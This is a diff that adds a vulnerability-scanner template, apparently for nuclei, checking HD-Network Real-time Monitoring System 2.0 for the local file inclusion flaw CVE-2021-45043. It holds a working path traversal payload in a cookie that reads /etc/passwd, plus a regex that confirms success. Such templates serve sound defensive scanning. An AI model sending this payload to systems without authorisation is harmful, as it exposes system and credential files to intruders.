@@ -1,0 +1,29 @@
+id: cve-2021-45043
+info:
+  name: HD-Network Real-time Monitoring System 2.0 Local File Inclusion
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    HD-Network Real-time Monitoring System 2.0 has a local file inclusion (LFI) vulnerability. Attackers can obtain sensitive user information such as passwords to further control the system.
+  classification:
+    cve-id: CVE-2021-45043
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-45043.yaml
+    - https://www.zkteco.com
+
+http:
+  - raw:
+      - |
+        GET /language/lang HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        Cookie: s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*?:0:0:"
+        part: body
